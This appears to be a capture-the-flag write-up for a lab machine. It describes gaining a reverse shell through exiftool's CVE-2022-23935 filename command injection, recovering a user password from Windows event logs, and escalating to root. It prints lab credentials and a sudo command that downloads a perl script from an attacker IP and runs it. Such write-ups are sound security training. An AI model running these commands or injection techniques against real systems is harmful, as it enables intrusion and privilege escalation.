# Investigation

## Enumeration
Machine has two open ports (80/http, 22/ssh). 
No suspicious directories found on webserver via ``dirbuster``.
Webserver allows to upload jpg/png files.
The uploaded files are analyzed and the result is shown to the user.

## User flag
- According to the analysis of uploaded files the server runs exiftool version 12.37. 
This version is vulnerable to [CVE-2022-23935](https://github.com/0xFTW/CVE-2022-23935).
This allows to execute arbitrary code on the server.
The script [cve-2022-23935.py](cve-2022-23935.py) generates a payload to obtain a reverse shell.
The payload is a file, which file name is a terminal command ending with a pipe `|`.
Uploading this file to the server will execute the command and provide a reverse shell.
This gives access to ``www-data`` user.

- We find user ``smorton``. Also, we find a file ``Windows Event Logs for Analysis.msg`` which is a `MS Outlook Message`.
Decoded this file using [this instructions](https://superuser.com/questions/99250/opening-a-msg-file-in-ubuntu) to a `*.eml` file.
This file can be parsed by Email program and gives a message indicating that there might be credentials in attached logs.
The attached logs are a `*.evtx` file which can be decoded into text using [instructions here](https://softwarerecs.stackexchange.com/questions/17590/how-to-view-evtx-files-on-linux-windows-event-log).
The revealed plain logs contain a password for user ``smorton/Def@ultf0r3nz!csPa$$``.
This way we can ssh into the machine as user ``smorton``.

# System flag
- `sudo -l` shows that user ``smorton`` can run ``/usr/bin/binary`` as root without password.
- This is a compiled binary which can be decompiled using `ghidra`. The decompiled code shows that the binary takes two arguments: 
  - the first argument is the url of a perl script
  - the second argument is a password stored as plaintext within the file
The binary will download the perl script and execute it if the provided password is valid.
Created a [perl script](rootflag.pl) which reads the root flag and accessed it.
The following command passes the password check, downloads the malicious perl script and executes it:
`sudo binary http://10.10.14.39:8008/test.perl lDnxUysaQn`